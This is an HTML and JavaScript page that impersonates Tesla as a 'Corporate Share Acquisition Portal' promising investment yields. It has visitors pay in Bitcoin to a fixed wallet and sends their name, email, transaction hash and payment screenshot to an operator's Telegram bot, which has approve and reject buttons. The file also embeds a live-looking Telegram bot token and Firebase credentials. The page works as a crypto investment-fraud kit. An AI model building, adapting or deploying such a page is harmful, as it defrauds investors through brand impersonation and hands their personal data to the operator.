<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tesla Milestone | Purchase Shares</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        body { background-color: #f4f4f5; color: #18181b; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        .tesla-card { background: #ffffff; border: 1px solid #e4e4e7; box-shadow: 0 4px 20px -2px rgba(0, 0, 0, 0.04); }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">

    <div class="max-w-md w-full space-y-6">
        
        <!-- Header -->
        <div class="text-center space-y-2">
            <div class="w-12 h-12 bg-zinc-900 text-white rounded-2xl flex items-center justify-center font-black text-xl mx-auto shadow-md">T</div>
            <h1 class="font-extrabold text-zinc-900 text-xl tracking-tight">TESLA MILESTONE</h1>
            <p class="text-xs text-zinc-500">Corporate Share Acquisition Portal</p>
        </div>

        <!-- STEP 1: SELECT INVESTMENT AMOUNT & DURATION -->
        <div id="step-config" class="tesla-card rounded-2xl p-8 space-y-6">
            <div class="space-y-1">
                <h2 class="font-bold text-zinc-900 text-base flex items-center">
                    <i data-lucide="trending-up" class="w-4 h-4 mr-2 text-emerald-600"></i> Configure Investment
                </h2>
                <p class="text-xs text-zinc-500">Select your capital principal and lock-in duration.</p>
            </div>

            <form onsubmit="proceedToPayment(event)" class="space-y-4">
                <div>
                    <label class="block text-[10px] font-bold uppercase tracking-wider text-zinc-600 mb-1">Investment Amount ($ USD)</label>
                    <input type="number" id="inv-amount" required min="100" placeholder="e.g. 1000" class="w-full px-4 py-3 rounded-xl border border-zinc-200 text-xs font-mono bg-zinc-50 outline-none">
                </div>
                <div>
                    <label class="block text-[10px] font-bold uppercase tracking-wider text-zinc-600 mb-1">Duration Plan</label>
                    <select id="inv-duration" class="w-full px-4 py-3 rounded-xl border border-zinc-200 text-xs bg-zinc-50 outline-none">
                        <option value="6 Months">6 Months (Standard Yield)</option>
                        <option value="12 Months">12 Months (High Growth)</option>
                        <option value="24 Months">24 Months (Maximum Dividend)</option>
                    </select>
                </div>
                <button type="submit" class="w-full py-3 bg-zinc-900 hover:bg-zinc-800 text-white font-bold rounded-xl text-xs transition shadow-sm">
                    Proceed to Payment Options
                </button>
            </form>
        </div>

        <!-- STEP 2: BITCOIN PAYMENT & PROOF SUBMISSION (Hidden initially) -->
        <div id="step-payment" class="tesla-card rounded-2xl p-8 space-y-6 hidden">
            <div class="space-y-1">
                <h2 class="font-bold text-zinc-900 text-base flex items-center">
                    <i data-lucide="bitcoin" class="w-4 h-4 mr-2 text-amber-500"></i> Bitcoin Payment Gateway
                </h2>
                <p class="text-xs text-zinc-500">Scan the QR code or send exact crypto to the address below.</p>
            </div>

            <div class="space-y-4 bg-zinc-50 p-4 rounded-xl border border-zinc-200 text-center">
                <!-- Dynamic QR Code generator via API -->
                <div class="bg-white p-3 rounded-lg inline-block shadow-sm">
                    <img id="btc-qr" src="" alt="Bitcoin QR Code" class="w-32 h-32 mx-auto">
                </div>
                <div>
                    <span class="block text-[10px] font-bold uppercase tracking-wider text-zinc-500">Bitcoin Deposit Address</span>
                    <input type="text" readonly id="btc-address-text" value="bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" class="w-full text-center px-2 py-1.5 mt-1 bg-white border border-zinc-200 rounded-lg text-[11px] font-mono select-all">
                </div>
                <div class="text-[11px] text-zinc-600 font-medium">
                    Amount Due: <span id="display-usd-due" class="font-bold text-zinc-900"></span>
                </div>
            </div>

            <form onsubmit="submitPaymentProof(event)" class="space-y-4">
                <div>
                    <label class="block text-[10px] font-bold uppercase tracking-wider text-zinc-600 mb-1">Transaction Hash / ID</label>
                    <input type="text" id="tx-id" required placeholder="e.g. 4a5f8b9c... or TxID number" class="w-full px-4 py-2.5 rounded-xl border border-zinc-200 text-xs font-mono bg-zinc-50 outline-none">
                </div>
                <div>
                    <label class="block text-[10px] font-bold uppercase tracking-wider text-zinc-600 mb-1">Upload Payment Screenshot</label>
                    <input type="file" id="tx-screenshot" accept="image/*" required class="w-full text-xs text-zinc-500 file:mr-4 file:py-2 file:px-4 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-zinc-100 file:text-zinc-700 hover:file:bg-zinc-200 cursor-pointer">
                </div>
                <button type="submit" id="submit-proof-btn" class="w-full py-3 bg-emerald-600 hover:bg-emerald-700 text-white font-bold rounded-xl text-xs transition shadow-sm">
                    Submit Payment Proof for Approval
                </button>
            </form>
        </div>

    </div>

    <!-- Firebase & Telegram Logic Script -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.19.0/firebase-app.js";
        import { getFirestore, doc, setDoc, arrayUnion, Timestamp } from "https://www.gstatic.com/firebasejs/12.19.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAmPw9jUbbvorS-9V9y_uIIivOl5Y92hBY",
            authDomain: "teslamilestone-6ce77.firebaseapp.com",
            projectId: "teslamilestone-6ce77",
            storageBucket: "teslamilestone-6ce77.firebasestorage.app",
            messagingSenderId: "603266005390",
            appId: "1:603266005390:web:219be0276e2ac5db068cdf",
            measurementId: "G-7HLBL47YTT"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        const TELEGRAM_BOT_TOKEN = "8630191514:AAHnhtahysDQC4wGpA3HW7FiAjjnWRCv9Fk";
        const TELEGRAM_CHAT_ID = "8696262458";
        const BTC_WALLET = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh";

        let selectedAmount = 0;
        let selectedDuration = '';

        window.addEventListener('DOMContentLoaded', () => {
            if(!localStorage.getItem('tesla_client_uid')) {
                window.location.href = 'index.html';
            }
        });

        window.proceedToPayment = function(e) {
            e.preventDefault();
            selectedAmount = parseFloat(document.getElementById('inv-amount').value);
            selectedDuration = document.getElementById('inv-duration').value;

            document.getElementById('display-usd-due').innerText = `$${selectedAmount.toLocaleString()} USD`;
            
            // Generate QR Code via open API using Bitcoin URI scheme
            const btcUri = `bitcoin:${BTC_WALLET}?amount=0.002&label=TeslaMilestone`;
            document.getElementById('btc-qr').src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(btcUri)}`;

            document.getElementById('step-config').classList.add('hidden');
            document.getElementById('step-payment').classList.remove('hidden');
        }

        window.submitPaymentProof = async function(e) {
            e.preventDefault();
            const txId = document.getElementById('tx-id').value.trim();
            const screenshot = document.getElementById('tx-screenshot').files[0];
            const clientName = localStorage.getItem('tesla_client_name') || 'Client';
            const clientEmail = localStorage.getItem('tesla_client_email') || 'Unknown';
            const clientUid = localStorage.getItem('tesla_client_uid');

            const btn = document.getElementById('submit-proof-btn');
            btn.innerText = "Transmitting to Telegram & Cloud...";
            btn.disabled = true;

            const transactionId = 'TX-' + Math.floor(100000 + Math.random() * 900000);

            try {
                // 1. Create a Pending Transaction Record in Firestore
                const clientRef = doc(db, "clients", clientUid);
                const txPayload = {
                    id: transactionId,
                    amount: selectedAmount,
                    type: `Share Purchase (${selectedDuration})`,
                    duration: selectedDuration,
                    txHash: txId,
                    status: 'Pending',
                    date: new Date().toLocaleString()
                };

                await setDoc(clientRef, {
                    transactions: arrayUnion(txPayload)
                }, { merge: true });

                // 2. Send Telegram Notification with Inline Approve/Reject Buttons
                const msg = `💰 *NEW SHARE PURCHASE DEPOSIT* 💰\n\n*Client:* ${clientName}\n*Email:* ${clientEmail}\n*Amount:* $${selectedAmount.toLocaleString()} USD\n*Duration:* ${selectedDuration}\n*TxID:* \`${txId}\`\n*Status:* Pending Review`;
                
                // Telegram Inline Keyboard for instant click action
                const inlineKeyboard = {
                    inline_keyboard: [
                        [
                            { text: "✅ APPROVE", callback_data: `approve_${clientUid}_${transactionId}_${selectedAmount}` },
                            { text: "❌ REJECT", callback_data: `reject_${clientUid}_${transactionId}` }
                        ]
                    ]
                };

                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: msg,
                        parse_mode: 'Markdown',
                        reply_markup: inlineKeyboard
                    })
                });

                // Send Screenshot Proof to Telegram
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', screenshot, 'Payment_Proof.jpg');
                formData.append('caption', `Payment Proof for ${clientName} - TxID: ${txId}`);
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });

                alert("Payment proof submitted successfully! Your deposit is pending admin verification.");
                window.location.href = 'dashboard.html';

            } catch(err) {
                console.error(err);
                alert("Network transmission error. Please try again.");
                btn.innerText = "Submit Payment Proof for Approval";
                btn.disabled = false;
            }
        }
    </script>
    <script>lucide.createIcons();</script>
</body>
</html>
